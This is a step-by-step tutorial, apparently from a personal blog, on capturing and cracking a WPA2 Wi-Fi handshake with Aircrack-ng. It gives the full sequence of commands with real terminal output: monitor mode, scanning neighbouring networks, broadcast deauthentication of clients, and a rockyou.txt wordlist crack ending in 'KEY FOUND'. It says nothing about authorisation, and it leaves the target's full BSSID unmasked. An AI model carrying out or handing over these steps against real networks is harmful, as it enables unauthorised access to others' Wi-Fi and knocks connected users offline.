
* * *

## What is Aircrack-ng?

- Aircrack-ng is a suite of tools used to:
- Capture packets from Wi-Fi networks 🎯
- Crack WEP and WPA/WPA2 keys using captured data 🔓
- Test Wi-Fi security (monitoring, attacking, testing)

* * *

# To capture the WEP/WPA1/WPA2 handshake and crack the wi-fi password

## 1.converting the Wi-fi Adapter from managed to monitor (not all the wi-fi adapter support this)

```
┌──(admin㉿hexecutioners)-[~]
└─$ iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

docker0   no wireless extensions.

wlan0     IEEE 802.11  ESSID:**[hidden network name]** 
          Mode:Managed  Frequency:2.437 GHz  Access Point: **[hidden BSSID]**   
          Tx-Power=22 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=62/70  Signal level=-48 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:3  Invalid misc:14   Missed beacon:0
```

#### we need to change the Mode: Managed to Monitor

```
sudo airmon-ng start wlan0
```

```
┌──(admin㉿hexecutioners)-[~]
└─$ iwconfig                      
lo        no wireless extensions.

eth0      no wireless extensions.

docker0   no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

#### Now the Mode changed to Monitor

## Now we are going to scan the wifi's and hotspots

```
sudo airodump-ng wlan0mon
```

```
  CH  8 ][ Elapsed: 0 s ][ 2025-08-06 12:01                                                                          
                                                                                                                    
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID   
 C8:xx:xx:xx:xx:24  -88        0        0    0   6   65   WEP  WEP         HP-Print-24-LaserJet
 58:xx:xx:xx:xx:5B  -67        3        0    0   3  130   WPA2 CCMP   PSK  SREE                                     
 F6:xx:xx:xx:xx:4F  -47        7        0    0   6  130   WPA2 CCMP   PSK  DESKTOP-31GUN6C 0841  
 50:xx:xx:xx:xx:00  -58        2        0    0   6  260   WPA2 CCMP   PSK  MAX                                     
 1A:xx:xx:xx:xx:CB  -60        3        0    0   6   65   WPA2 CCMP   PSK  DIRECT-KIDESKTOP-0KVU8IQmsST             
 AA:xx:xx:xx:xx:D5  -11        3        0    0  11  180   WPA2 CCMP   PSK  realme 12x 5G   
```

## here my target is *DESKTOP-31GUN6C* and the BSSID F6:4E:E3:90:9D:4F

## command to capture the wpa handshake

```
sudo airodump-ng --bssid  F6:xx:xx:xx:xx:4F -c <channel number> -w capture  wlan0mon
```

```
 CH  6 ][ Elapsed: 4 mins ][ 2025-08-06 12:07 ][ WPA handshake: F6:xx:xx:xx:xx:4F                                   
                                                                                                                    
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                
                                                                                                                    
 F6:xx:xx:xx:xx:4F  -43 100     2563     1502    4   6  130   WPA2 CCMP   PSK  DESKTOP-31GUN6C 0841                 
                                                                                                                    
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                  
                                                                                                                    
 F6:xx:xx:xx:xx:4F  AC:xx:xx:xx:xx:9C  -75    0 - 1      0      386                                                 
 F6:xx:xx:xx:xx:4F  D8:xx:xx:xx:xx:C6  -51   12e-24e   101      452  EAPOL                                          
 F6:xx:xx:xx:xx:4F  68:xx:xx:xx:xx:02  -49    1e- 1e     0      231  EAPOL                                          
 F6:xx:xx:xx:xx:4F  68:xx:xx:xx:xx:F8  -64    1e- 1e     0      219  EAPOL                                          
 F6:xx:xx:xx:xx:4F  14:xx:xx:xx:xx:CB  -51    1e- 6e     0     1281  EAPOL  DESKTOP-31GUN6C 0841  
```

### there you can see the hand shake F6:xx:xx:xx:xx:4F

### it is got deauthenticating a user if it is not deauthenticating then we can run a manual command on the other tab

```
sudo aireplay-ng --deauth 5 -a F6:xx:xx:xx:xx:4F wlan0mon

[sudo] password for balu: 
12:07:02  Waiting for beacon frame (BSSID: F6:4E:E3:90:9D:4F) on channel 6
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
12:07:02  Sending DeAuth (code 7) to broadcast -- BSSID: [F6:xx:xx:xx:xx:4F]
12:07:02  Sending DeAuth (code 7) to broadcast -- BSSID: [F6:xx:xx:xx:xx:4F]
12:07:03  Sending DeAuth (code 7) to broadcast -- BSSID: [F6:xx:xx:xx:xx:4F]
12:07:03  Sending DeAuth (code 7) to broadcast -- BSSID: [F6:xx:xx:xx:xx:4F]
12:07:04  Sending DeAuth (code 7) to broadcast -- BSSID: [F6:xx:xx:xx:xx:4F]

```

### Then check you will get a handshake (not possible for wpa3)

## Now we need to crack the handshake using wordlist

```
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b F6:xx:xx:xx:xx:4F capture-01.cap
```

### then it check with all rockyou.txt file if it is not cracked then it means the password is not there in rockyou.txt

```
Reading packets, please wait...
Opening capture-01.cap
Resetting EAPOL Handshake decoder state.
Read 83449 packets.

1 potential targets
 
                           
                           
                           Aircrack-ng 1.7 

      [00:00:00] 2822/10303727 keys tested (6296.61 k/s) 

      Time left: 27 minutes, 15 seconds                          0.03%

                           KEY FOUND! [ ******** ] #password is hidden for the privacy issues


      Master Key     : 34 83 18 87 BB 17 D9 73 57 C0 F5 DC EC ED 7A 5D 
                       4C 1C 48 00 4F A0 0B E6 82 C6 9F 2E 66 68 A6 C7 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 50 4D DA 96 D9 E1 0F 91 76 D2 C5 3A C4 BF 12 C0 
```

## KEY FOUND! \[ \*\*\*\*\*\*\*\* \] -> it is the password

* * *

# Then coming back to the Managed

```
sudo airmon-ng stop wlan0mon
```

### if it is saying network manager is not running

```
sudo systemctl restart NetworkManager.service
```
